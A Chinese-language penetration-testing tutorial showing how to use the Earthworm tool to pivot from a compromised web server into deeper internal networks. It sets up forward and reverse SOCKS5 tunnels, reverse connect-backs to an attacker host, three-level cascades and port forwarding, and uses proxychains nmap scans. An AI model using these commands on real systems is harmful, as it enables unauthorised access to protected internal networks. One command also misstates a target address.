# 使用ew完成多场景下内网代理穿透

## 0x01 需求

当渗透进行到内网，常需要将流量代理到内网进行进一步扩展如：

* 端口扫描
* 端口转发
* 访问内网web服务
* ……

## 0x02 场景

以下模拟一个使用场景。

### 1、环境配置、网络拓扑

* A1 - 120.x.x.x - Kali - 公网攻击服务器
* V1 - 10.10.1.111 - Centos - 内网服务器，**对公网开放但无公网IP**，80端口存在web应用，通过一台nginx对公网开放，现已获得webshell，**路由可抵达10.10.1段**。
* V2 - 10.10.2.111 - Centos - 内网服务器，**不对公网开放，路由可抵达10.10.1和10.10.3段**。
* V3 - 10.10.3.111 - Centos - 内网服务器，**不对公网开放**，**8080**端口存在**web应用**，10.10.2段路由可达，**10.10.1段路由不可达**。

![2019-08-09T07:37:44.png](images/1798188814.png "2019-08-09T07:37:44.png")

### 2、前提描述

在一次渗透中，操作A1对V1上web应用进行渗透，获取了V1的webshell，并反弹shell到A1上。接下来打算做内网渗透，进一步发现内网资源。

## 0x03 操作

实现内网穿透的工具有很多，如**Earthworm，Termite，reGeorg，nps**等，此处主要利用ew对模拟内网进行操作。

**[EW（Earthworm）](http://rootkiter.com/EarthWorm)**是一套便携式的网络穿透工具，具有SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。

能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，突破网络限制。

![2019-07-06T07:41:12.png](images/2413381622.png "2019-07-06T07:41:12.png")

共有6中模式：

* ssocksd - 正向代理
* rcsocks - 反向代理1，流量转发
* rssocks - 反向代理2，反弹socks5
* lcx_listen - 反向代理1，流量转发
* lcx_tran - 端口转发
* lcx_slave - 端口绑定

### 场景一：把流量代理到V1，进行内网信息收集

获得V1的shell后，先下载ew，准备架设socks5，将流量代理本地。

这里可以选择两种方式：**正向代理**和**反向代理**。

**正向代理：**

假设目标机V1有公网IP（**139.x.x.x**），可以使用正向的方式代理流量。

在目标机V1上启动socks5服务并监听1080端口：

```bash
./ew -s ssocksd -l 1080
```

接着流量代理到139.x.x.x的1080端口，就相当于把流量代理到目标机V1了，就可以使用相关工具做进一步渗透。

A1上proxychains代理配置：

```bash
vi /etc/proxychains.conf
[ProxyList]
socks5    139.x.x.x    1080

```

**反向代理：**

由于场景中目标机V1没有公网IP，但是能访问公网。因为V1没有具体地址，无法使用正向连接，可使用反弹连接的方式代理流量。

在攻击机A1本地启动流量转发，将来自外部1080端口的流量转发到本地8888端口，并等待目标反弹连接：

```bash
./ew -s rcsocks -l 1080 -e 8888

```

在目标机V1上启动socks5服务，并反弹到攻击机A1的8888端口：

```bash
./ew -s rssocks -d 120.x.x.x -e 8888

```

代理通道架设完毕，访问A1的1080相当于访问V1的8888端口，在攻击机A1上使用proxychain将流量代理到本地1080端口，相当于把流量代理到目标机V1上了，在A1上发起请求相当于在V1上发起请求，然后可以使用相关工具做进一步渗透。

A1上proxychains代理配置：

```bash
[ProxyList]
socks5    127.0.0.1    1080

```

接下来借助V1进一步发现内网各段的机器，在A1上使用nmap扫描端口：

```bash
proxychains nmap -p xxx 

```

-sT -Pn -open 10.10.1.111/16

**注意：由于proxychains无法代理icmp的数据包，要加上禁ping参数-Pn（不检测主机是否存活，直接进行端口tcp扫描）**

扫描结果发现仅能抵达10.2段内网机器V2-10.10.2.111，开放了22以及其他端口

尝试对V2进行渗透，在V1上发现已设置了V2的免密登录，在之前V1反弹的shell中用ssh成功登录到V2。

### 场景二：把流量代理到V2，进行进一步信息收集[](#场景二：把流量代理到v2，进行进一步信息收集)

现已获得V2的shell，检查发现V2不通公网，无法反向代理公网流量，需要通过V1进行多级代理。接下来将流量代理到V2上进行进一步探测。

这里同样有两种方式：**正向代理**和**反向代理**。

**正向代理：**

假设目标机V1有公网IP（139.x.x.x），可以使用正向的方式代理流量。

在目标机V2上启动socks5代理并监听9999端口：

```bash
./ew -s ssocksd -l 9999

```

在V1上启动流量转发，将V1的1080端口与V2的9999端口绑定，建立socks5通道：

```bash
./ew -s lcx_tran -l 1080 -f 10.10.2.111 -g 9999

```

接着流量代理到139.x.x.x的1080端口，就相当于把流量代理到目标机V2上了。

A1上proxychains代理配置：

```bash
[ProxyList]
socks5    139.x.x.x    1080

```

**反向代理：**

在攻击机A1本地启动流量转发，将来自外部1080端口的流量转发到本地8888端口，并等待目标反弹连接：

```bash
./ew -s lcx_listen -l 1080 -e 8888

```

传输ew到V2上，在V2启动socks5代理并监听9999端口：

```bash
./ew -s ssocksd -l 9999

```

最后在V1执行，将A1的8888端口与V2的9999端口绑定，建立socks5通道：

```bash
./ew -s lcx_slave -d 120.x.x.x -e 8888 -f 10.10.2.111 -g 9999

```

代理通道架设完毕，访问A1的1080相当于访问V2的9999端口，在攻击机A1上使用proxychain将流量代理到本地1080端口，相当于把流量代理到目标机V2上了，在A1上发起请求相当于在V2上发起请求。
A1上proxychains代理配置：

```bash
[ProxyList]
socks5    127.0.0.1    1080
```

接着就可以使用相关工具做进一步渗透，此处先在A1上使用nmap扫描端口：

```bash
proxychains nmap -p xxx -sT -Pn -open 10.10.2.111/16

```

扫描结果发现能抵达10.3网段的一台内网机器V3-10.10.3.111，开放端口为8080。

**根据之前在V1上的扫描结果，10.1段无法抵达10.3段，但是通过V2做跳板，可以访问到更深一层的内网机器和应用。**

对A1浏览器进行代理设置，代理到本地1080端口，即把流量代理到了V2，从而可以访问V3上的内网web应用。

尝试在浏览器上访问[http://10.10.3.111](http://10.10.3.111):8080，发现是某运维管理系统，接下来便可以进一步web渗透，略。

### 场景三：假设已获得V3的shell，现将流量代理到V3。（三级级联）

**正向代理：**

假设目标机V1有公网IP（139.x.x.x），可以使用正向的方式代理流量。

在V1上启动流量转发，将V1的1080端口与V2的9999端口绑定，建立socks5通道：

```bash
./ew -s lcx_tran -l 1080 -f 10.10.2.111 -g 9999

```

在V2上启动流量转发，将V2的9999 端口与V3的8888端口绑定，建立socks5通道：

```bash
./ew -s lcx_tran -l 9999 -f 10.10.3.111 -g 8888

```

在目标机V3上启动socks5代理并监听8888端口：

```bash
./ew -s ssocksd -l 8888

```

**方式不止一种：通过场景二中反向代理的方式，从V1→V3架设也能实现。**

接着流量代理到139.x.x.x的1080端口，就相当于把流量代理到目标机V3上了。

A1上proxychains代理配置：

```bash
[ProxyList]
socks5    139.x.x.x    1080

```

**反向代理：**

在攻击机A1执行，本地启动流量转发，将来自外部1080端口的流量转发到本地的8888端口，并等待目标反弹连接：

```bash
./ew -s rcsocks -l 1080 -e 8888

```

在V1执行，将A1的8888端口与V2的9999端口绑定，建立socks5通道：

```bash
./ew -s lcx_slave -d 120.x.x.x -e 8888 -f 10.10.2.111 -g 9999

```

在V2执行，本地启动流量转发，将来自外部9999端口的流量转发到本地的7777端口，等待目标机V3反弹连接：

```bash
./ew -s lcx_listen -l 9999 -e 7777

```

在目标机V3执行，启动socks5服务，并反弹到V2的7777端口：

```bash
./ew -s rssocks -d 10.10.2.111 -e 7777

```

代理通道架设完毕，访问A1的1080相当于访问V3的7777端口，在攻击机A1上使用proxychain将流量代理到本地1080端口，相当于把流量代理到目标机V3上了，在A1上发起请求相当于在V3上发起请求。

A1上proxychains代理配置：

```bash
[ProxyList]
socks5    127.0.0.1    1080

```

### 场景四：三级级联下的端口转发操作

ew同样支持内网端口转发，现将内网目标机V3上的web应用端口代理到外网。

**正向代理：**

假设目标机V1有公网IP（139.x.x.x），可以使用正向的方式代理流量。

在V1上启动流量转发，将V1的1080端口与V2的9999端口绑定，建立socks5通道：

```bash
./ew -s lcx_tran -l 1080 -f 10.10.2.111 -g 9999

```

在V2上启动流量转发，将V2的9999端口与V3的8080端口绑定，建立socks5通道：

```bash
./ew -s lcx_tran -l 9999 -f 10.10.3.111 -g 8080

```

代理通道架设完毕，访问V1的1080相当于访问V3的8080端口。

A1浏览器上访问[http://139.x.x.x](http://139.x.x.x):1080，即访问V3上的内网web应用。

**反向代理：**

在A1执行，本地启动流量转发，将来自外部1080端口的流量转发到本地的8888端口，并等待目标反弹连接：

```bash
./ew -s lcx_listen -l 1080 -e 8888

```

在V1执行，将A1的8888端口与V2的9999端口绑定，建立socks5通道：

```bash
./ew -s lcx_slave -d 120.x.x.x -e 8888 -f 10.10.2.111 -g 9999

```

在V2执行，启动流量转发，将V2的9999端口与V3的8080端口绑定，建立socks5通道：

```bash
./ew -s lcx_tran -l 9999 -f 10.3.10.111 -g 8080

```

代理通道架设完毕，访问A1的1080相当于访问V3的8080端口。

A1浏览器上访问[http://127.0.0.1](http://127.0.0.1):1080，即访问V3上的内网web应用。

## 0x04 总结

实战中的多样化场景可能更加复杂也可能比较简单，无法一一阐述，篇章尽量覆盖常见类型场景，描述了4种场景下ew的基本使用。

内容都是基础，工具在使用上也无太多难处，关键在于**弄清楚实战中目标内网数据流向**，把复杂的大场景拆分成若干个小场景，使问题变得简单。

纸上得来终觉浅，绝知此事要躬行，多实操多思考，方能不断进步。